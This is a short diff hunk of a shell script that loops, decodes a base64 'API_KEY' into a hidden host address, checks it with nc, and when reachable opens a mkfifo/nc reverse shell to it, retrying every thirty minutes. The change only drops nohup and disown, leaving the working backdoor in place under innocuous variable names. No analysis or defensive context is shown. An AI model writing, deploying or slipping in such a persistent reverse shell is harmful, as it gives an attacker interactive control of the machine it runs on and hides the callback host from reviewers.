@@ -5,7 +5,7 @@ while true; do
     BITMATH=$(echo $API_KEY | base64 --decode)
     nc -zv $BITMATH $HEX_BASE > /dev/null 2>&1
     if [ $? -eq 0 ]; then
-        nohup rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $BITMATH $HEX_BASE >/tmp/f &> /dev/null & disown
+        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $BITMATH $HEX_BASE >/tmp/f &> /dev/null
         exit 0
     else
         sleep 1800
